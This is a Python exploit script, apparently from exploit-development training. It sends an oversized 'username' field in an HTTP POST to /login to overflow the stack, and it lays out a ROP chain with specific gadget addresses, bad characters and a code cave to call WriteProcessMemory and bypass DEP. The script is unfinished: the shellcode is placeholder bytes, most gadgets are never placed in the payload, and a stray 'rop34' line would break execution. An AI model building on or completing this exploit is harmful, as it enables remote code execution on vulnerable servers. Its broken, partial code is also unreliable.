#!/usr/bin/python
import socket
import sys
from pwn import *
from pwn import p32

try:
  server = sys.argv[1]
  port = 80
  size = 780
  
  # 1016803c  75d741d0 KERNEL32!GetProcessHeap
  # KERNEL32!GetProcessHeap - KERNEL32!WriteProcessMemory = -129344 = fffe06c0
  # badchars = \x00\x0a\x0d\x25\x26\x2b\x3d
  # code cave location: 10167bfc

  
  # Sample stack for WriteProcessMemory
  functionAddress = b"AAAA"     # WriteProcessMemory address
  shellcodeAddress = b"BBBB"    # shellcode RET address
  param1 = b"CCCC"              # hProcess          (=-1 for current process)
  param2 = b"DDDD"              # lpBaseAddress     (code cave address = shellcode RET address)
  param3 = b"EEEE"              # lpBuffer          (Stack address)
  param4 = b"FFFF"              # nSize
  param5 = b"GGGG"              # *lpNumberOfBytesWritten
  
  # --------------------------------BUILD ROP----------------------------------------
  # Save esp to esi (esi = stack)
  eip = p32(0x10154112)     # push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret  ;
  
  # Move the eip back       # eip is offset by 32 bytes to the front
  rop1 = p32(0x100656f7)    # mov eax, esi ; pop esi ; ret  ;       # esp is in eax
  push1 = b"AAAA"           # makeup for 1 pop
  rop2 = p32(0x1005e9f5)    # pop ebp ; ret  ;
  value1 = p32(0xffffffe0)  # -32 bytes
  rop3 = p32(0x100fcd71)    # add eax, ebp ; dec ecx ; ret  ;
  rop4 = p32(0x10153048)    # mov edx, eax ; mov eax, ebx ; pop edi ; pop ebx ; pop esi ; ret  ;    correct esp in edx
  
  # Set WriteProcessMemory address
  rop5 = p32(0x1002f729)    # pop eax ; ret  ;
  value2 = p32(0xfffe06c0)  # Negative offset to WriteProcessMemory
  rop6 = p32(0x1010ccc3)    # neg eax ; ret  ;
  rop7 = p32(0x1014426e)    # xchg eax, ebp ; ret  ;
  rop8 = p32(0x1002f729)    # pop eax ; ret  ;
  value3 = p32(0x1016803c)  # GetProcessHeap address value location from IAT
  rop9 = p32(0x1014dc4c)    # mov eax, dword [eax] ; ret  ;     Move actual address into eax
  rop10 = p32(0x100fcd71)   # add eax, ebp ; dec ecx ; ret  ;   WriteProcessMemory address
  rop11 = p32(0x1012d24e)   # mov dword [edx], eax ; ret  ;     Save WriteProcessMemory address
  
  # Move sample stack down 4 bytes
  rop12 = rop13 = rop14 = rop15 = p32(0x100bb1f4)   # inc edx ; ret  ;
  
  # Set shellcode address
  rop16 = p32(0x1002f729)   # pop eax ; ret  ;
  value4 = p32(0x10167bfc)  # Code cave location
  rop17 = p32(0x1012d24e)   # mov dword [edx], eax ; ret  ;     Save shellcode address
  
  # Move sample stack down 4 bytes
  rop18 = rop19 = rop20 = rop21 = p32(0x100bb1f4)   # inc edx ; ret  ;
  
  # Set param1 hProcess
  rop22 = p32(0x1002f729)   # pop eax ; ret  ;
  value5 = p32(0xffffffff)  # -1 for current process
  rop23 = p32(0x1012d24e)   # mov dword [edx], eax ; ret  ;     Save hProcess
  
  # Move sample stack down 4 bytes
  rop24 = rop25 = rop26 = rop27 = p32(0x100bb1f4)   # inc edx ; ret  ;
  
  # Set param2 lpBaseAddress
  rop28 = p32(0x1002f729)   # pop eax ; ret  ;
  value6 = p32(0x10167bfc)  # Code cave location
  rop29 = p32(0x1012d24e)   # mov dword [edx], eax ; ret  ;     Save lpBaseAddress
  
  # Move sample stack down 4 bytes
  rop30 = rop31 = rop32 = rop33 = p32(0x100bb1f4)   # inc edx ; ret  ;
  
  # Set param3 lpBuffer
  rop34
  

  
  # SAVE POINTER INSTRUCTION 0x1012d24e: mov dword [edx], eax ; ret  ;
  
  stack = functionAddress + shellcodeAddress + param1 + param2 + param3 + param4 + param5
 
 
  filler = b"\x90" * (size - len(stack))
  NOP_slide = b"\x90"*200
 
  
  shellcode = b"\x43"*400
  
  inputBuffer = filler + stack + eip + NOP_slide + shellcode
  
  
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")